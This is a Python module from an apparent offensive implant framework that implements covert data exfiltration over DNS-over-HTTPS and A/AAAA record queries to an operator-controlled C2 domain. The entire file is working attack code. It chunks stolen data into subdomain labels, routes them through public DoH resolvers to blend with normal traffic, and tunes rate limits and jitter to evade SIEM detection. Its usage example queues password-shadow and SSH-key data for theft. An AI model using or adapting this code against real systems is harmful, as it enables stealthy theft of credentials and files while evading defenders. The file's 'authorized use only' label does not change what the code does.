"""
AEGIS-SILENTIUM — node/exfil/doh.py
==================================
DNS-over-HTTPS (DoH) and A/AAAA record encoding exfiltration channels.

DoH Channel
───────────
Uses Cloudflare's (1.1.1.1/dns-query) or Google's (8.8.8.8/resolve) DoH
endpoint to resolve operator-controlled subdomains that encode exfiltrated
data.  This blends entirely with legitimate DoH traffic seen on enterprise
networks.

Data is base32-encoded (DNS-safe charset), then chunked into subdomain-length
labels (≤63 chars), queued at configurable intervals to avoid DNS flood alerts.
Each query resolves a subdomain like:
    <seq><chunk>.data.operator-domain.com

A/AAAA Record Encoding (low-bandwidth, ultra-covert)
────────────────────────────────────────────────────
Small amounts of data (4–16 bytes) can be encoded into crafted A/AAAA
responses served by the operator's authoritative DNS server.
The implant queries a subdomain and the operator server responds with
a crafted IP where payload bytes are embedded in the address octets.

Rate limiting is configurable to avoid triggering SIEM DNS anomaly rules.

AUTHORIZED USE ONLY — professional adversary simulation.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import math
import os
import queue
import re
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple
from urllib.request import Request, urlopen
from urllib.parse import urlencode, quote

log = logging.getLogger("aegis.exfil.doh")

# ────────────────────────────────────────────────────────────────────────────
# Constants
# ────────────────────────────────────────────────────────────────────────────
DOH_PROVIDERS = {
    "cloudflare": "https://1.1.1.1/dns-query",
    "google":     "https://8.8.8.8/resolve",
    "quad9":      "https://9.9.9.9/dns-query",
}
MAX_LABEL_LEN = 60        # DNS label max 63, leave 3 for seq prefix
MAX_FQDN_LEN = 253        # DNS FQDN max
DEFAULT_RATE_LIMIT = 2    # queries per second
DEFAULT_JITTER = 0.3      # fraction of inter-query delay to jitter
SEQ_WIDTH = 4             # hex chars for sequence number prefix on each label
EXFIL_TXT_RECORD = "TXT"
EXFIL_A_RECORD = "A"
EXFIL_AAAA_RECORD = "AAAA"


# ────────────────────────────────────────────────────────────────────────────
# Base32 encoding (uppercase, no padding, DNS-safe)
# ────────────────────────────────────────────────────────────────────────────
def _b32encode(data: bytes) -> str:
    """Base32 encode without padding; lowercase for DNS."""
    return base64.b32encode(data).decode().rstrip("=").lower()


def _b32decode(s: str) -> bytes:
    padded = s.upper() + "=" * (-len(s) % 8)
    return base64.b32decode(padded)


# ────────────────────────────────────────────────────────────────────────────
# Chunk data into DNS-safe labels
# ────────────────────────────────────────────────────────────────────────────
def _chunk_data(data: bytes, domain: str) -> List[Tuple[int, str]]:
    """
    Encode data as base32 and split into (seq, label) chunks sized to fit
    within DNS FQDN length limits.

    Returns list of (sequence_int, fqdn_string) tuples.
    """
    encoded = _b32encode(data)
    overhead = len(domain) + 2 + SEQ_WIDTH + 1  # .domain + dot + seq + dot
    max_data_per_label = MAX_FQDN_LEN - overhead
    max_data_per_label = min(max_data_per_label, MAX_LABEL_LEN - SEQ_WIDTH - 1)

    chunks = []
    total = math.ceil(len(encoded) / max_data_per_label)
    for seq, i in enumerate(range(0, len(encoded), max_data_per_label)):
        chunk = encoded[i:i + max_data_per_label]
        # Format: <seq_hex><data>.<domain>
        seq_prefix = format(seq, f"0{SEQ_WIDTH}x")
        label = f"{seq_prefix}{chunk}"
        fqdn = f"{label}.{domain}"
        chunks.append((seq, fqdn))

    return chunks


# ────────────────────────────────────────────────────────────────────────────
# DoH query helper
# ────────────────────────────────────────────────────────────────────────────
def _doh_query(fqdn: str, record_type: str = "TXT",
                provider_url: str = DOH_PROVIDERS["cloudflare"],
                timeout: int = 10) -> Optional[List[str]]:
    """
    Send a single DNS-over-HTTPS query and return answer strings.
    Returns None on failure.
    """
    # Use JSON API (RFC 8484 or Google JSON API)
    if "cloudflare" in provider_url or "1.1.1.1" in provider_url:
        url = f"{provider_url}?name={quote(fqdn)}&type={record_type}"
        headers = {"Accept": "application/dns-json"}
    else:
        url = f"{provider_url}?name={quote(fqdn)}&type={record_type}"
        headers = {"Accept": "application/json"}

    try:
        req = Request(url, headers=headers)
        with urlopen(req, timeout=timeout) as resp:
            data = json.loads(resp.read())
        answers = data.get("Answer", [])
        return [a.get("data", "") for a in answers if a.get("type") in (1, 16, 28, 99)]
    except Exception as e:
        log.debug("DoH query failed for %s: %s", fqdn, e)
        return None


# ────────────────────────────────────────────────────────────────────────────
# DNS exfiltration via TXT record queries
# ────────────────────────────────────────────────────────────────────────────
@dataclass
class DoHTunnel:
    """
    DNS-over-HTTPS exfiltration tunnel.

    The implant encodes data as base32, chunks it into DNS subdomain labels,
    and queries them sequentially via a DoH provider.  The operator's
    authoritative DNS server logs the queries and reassembles the data.

    Args:
        domain:        Operator-controlled apex domain (e.g., "data.c2.example.com")
        provider:      DoH provider name or URL ("cloudflare", "google", or custom URL)
        rate_limit:    Max queries per second
        jitter:        Fraction of inter-query interval to randomize
        session_id:    Optional identifier added to all queries for this session
    """
    domain: str
    provider: str = "cloudflare"
    rate_limit: float = DEFAULT_RATE_LIMIT
    jitter: float = DEFAULT_JITTER
    session_id: str = field(default_factory=lambda: _b32encode(os.urandom(4))[:8])

    def __post_init__(self):
        self._provider_url = DOH_PROVIDERS.get(self.provider, self.provider)
        self._min_interval = 1.0 / max(self.rate_limit, 0.01)

    def _jittered_delay(self) -> float:
        base = self._min_interval
        jitter = base * self.jitter * (2 * (hash(time.time()) % 100) / 100 - 1)
        return max(0.05, base + jitter)

    def send(self, data: bytes, label: str = "data",
              on_progress: Optional[Callable[[int, int], None]] = None) -> bool:
        """
        Exfiltrate data via DoH TXT record queries.

        Encodes as: <sess_id>.<seq_prefix><chunk>.<label>.<domain>
        Returns True if all chunks were sent successfully.
        """
        # Ensure data is bytes — callers may inadvertently pass str
        if isinstance(data, str):
            data = data.encode("utf-8")
        # Add metadata header (session, label, total-size)
        header = json.dumps({
            "s": self.session_id,
            "l": label,
            "z": len(data),
            "h": hashlib.sha256(data).hexdigest()[:16],
        }).encode()
        header_b32 = _b32encode(header)
        # Send header first as a special "start" query
        start_fqdn = f"s{header_b32[:MAX_LABEL_LEN]}.{self.session_id}.{self.domain}"
        _doh_query(start_fqdn, "TXT", self._provider_url)
        time.sleep(self._jittered_delay())

        chunks = _chunk_data(data, f"{self.session_id}.{self.domain}")
        total = len(chunks)
        success_count = 0

        for seq, fqdn in chunks:
            for attempt in range(3):
                result = _doh_query(fqdn, "TXT", self._provider_url)
                if result is not None:
                    success_count += 1
                    break
                time.sleep(0.5 * (attempt + 1))
            if on_progress:
                on_progress(seq + 1, total)
            time.sleep(self._jittered_delay())

        # Send end marker
        end_fqdn = f"e{format(total, '04x')}.{self.session_id}.{self.domain}"
        _doh_query(end_fqdn, "TXT", self._provider_url)

        log.info("DoH exfil: %d/%d chunks sent for session %s (label=%s)",
                  success_count, total, self.session_id, label)
        return success_count == total

    def send_async(self, data: bytes, label: str = "data") -> threading.Thread:
        """Non-blocking version — returns the thread."""
        t = threading.Thread(target=self.send, args=(data, label), daemon=True)
        t.start()
        return t


# ────────────────────────────────────────────────────────────────────────────
# A-Record encoding (ultra-low bandwidth, 4 bytes per query)
# ────────────────────────────────────────────────────────────────────────────
@dataclass
class ARecordTunnel:
    """
    Extremely covert data exfiltration via A record IP address encoding.

    Data is split into 4-byte chunks.  The implant queries subdomains of
    the operator's domain; the operator's authoritative DNS server responds
    with a crafted A record where the 4 IP octets carry the data bytes.

    This channel is one-way (implant→operator) and very low-bandwidth,
    suitable only for short key material, beacons, or status codes.

    Rate: limited to ~1 query/2 seconds to avoid triggering DNS anomaly rules.
    """
    domain: str
    rate_limit: float = 0.5  # queries/sec (very conservative)

    def send_bytes(self, data: bytes, prefix: str = "d") -> int:
        """
        Exfiltrate up to `data` bytes via A record queries.
        Returns number of chunks successfully queried.
        """
        interval = 1.0 / max(self.rate_limit, 0.01)
        chunks = [data[i:i + 4] for i in range(0, len(data), 4)]
        success = 0
        for seq, chunk in enumerate(chunks):
            padded = chunk.ljust(4, b"\x00")
            octet_str = ".".join(str(b) for b in padded)
            seq_hex = format(seq, "04x")
            fqdn = f"{prefix}{seq_hex}.{self.domain}"
            # The query itself carries the data in the subdomain
            # The response IP (from operator's authoritative server) carries
            # response data back (acknowledgements)
            result = _doh_query(fqdn, "A")
            if result:
                # Parse response IP for ack/commands
                log.debug("A-record ack for seq %d: %s", seq, result)
                success += 1
            time.sleep(interval + (hash(fqdn) % 100) / 1000)
        return success

    def receive_aaaa(self, fqdn: str) -> Optional[bytes]:
        """
        Query an AAAA record from the operator's server.
        The 16 bytes of the IPv6 address carry up to 16 bytes of data.
        """
        result = _doh_query(fqdn, "AAAA")
        if not result:
            return None
        addr = result[0].strip('"')
        try:
            packed = socket.inet_pton(socket.AF_INET6, addr)
            return packed
        except Exception:
            return None


# ────────────────────────────────────────────────────────────────────────────
# Queued async exfil manager
# ────────────────────────────────────────────────────────────────────────────
class DoHExfilQueue:
    """
    Thread-safe queue for staged DNS exfiltration.
    Items are queued and sent by a background worker thread at the configured rate.

    Usage:
        q = DoHExfilQueue(domain="data.c2.example.com", provider="cloudflare")
        q.start()
        q.enqueue(b"sensitive data", label="shadow_passwd")
        q.enqueue(b"more data",      label="ssh_key")
        q.stop()
    """

    def __init__(self, domain: str, provider: str = "cloudflare",
                  rate_limit: float = DEFAULT_RATE_LIMIT,
                  jitter: float = DEFAULT_JITTER):
        self._tunnel = DoHTunnel(domain=domain, provider=provider,
                                  rate_limit=rate_limit, jitter=jitter)
        self._queue: queue.Queue = queue.Queue(maxsize=100)
        self._worker: Optional[threading.Thread] = None
        self._stop_event = threading.Event()

    def start(self) -> None:
        self._stop_event.clear()
        self._worker = threading.Thread(target=self._run, daemon=True)
        self._worker.start()
        log.info("DoH exfil queue started (domain=%s)", self._tunnel.domain)

    def stop(self, timeout: float = 30.0) -> None:
        self._stop_event.set()
        if self._worker:
            self._worker.join(timeout=timeout)

    def enqueue(self, data: bytes, label: str = "data") -> bool:
        try:
            self._tunnel_clone = DoHTunnel(
                domain=self._tunnel.domain,
                provider=self._tunnel.provider,
                rate_limit=self._tunnel.rate_limit,
                jitter=self._tunnel.jitter,
                session_id=_b32encode(os.urandom(4))[:8],
            )
            self._queue.put_nowait((data, label))
            return True
        except queue.Full:
            log.warning("DoH exfil queue full — dropping item")
            return False

    def _run(self) -> None:
        while not self._stop_event.is_set():
            try:
                data, label = self._queue.get(timeout=1.0)
                self._tunnel.send(data, label)
                self._queue.task_done()
            except queue.Empty:
                continue
            except Exception as e:
                log.error("DoH exfil worker error: %s", e)


# ────────────────────────────────────────────────────────────────────────────
# Convenience function matching channels.py interface
# ────────────────────────────────────────────────────────────────────────────
def exfil_via_doh(data: bytes, label: str, domain: str,
                   provider: str = "cloudflare",
                   rate_limit: float = DEFAULT_RATE_LIMIT) -> bool:
    """
    One-shot DoH exfiltration.  Returns True on success.
    Compatible with the channels.exfil_to_c2() fallback chain.
    """
    tunnel = DoHTunnel(domain=domain, provider=provider, rate_limit=rate_limit)
    return tunnel.send(data, label)


def exfil_via_a_record(data: bytes, domain: str,
                        rate_limit: float = 0.5) -> int:
    """One-shot A-record exfiltration. Returns chunks sent."""
    tunnel = ARecordTunnel(domain=domain, rate_limit=rate_limit)
    return tunnel.send_bytes(data)


# ────────────────────────────────────────────────────────────────────────────
# Exports
# ────────────────────────────────────────────────────────────────────────────
__all__ = [
    "DoHTunnel",
    "ARecordTunnel",
    "DoHExfilQueue",
    "exfil_via_doh",
    "exfil_via_a_record",
    "DOH_PROVIDERS",
]
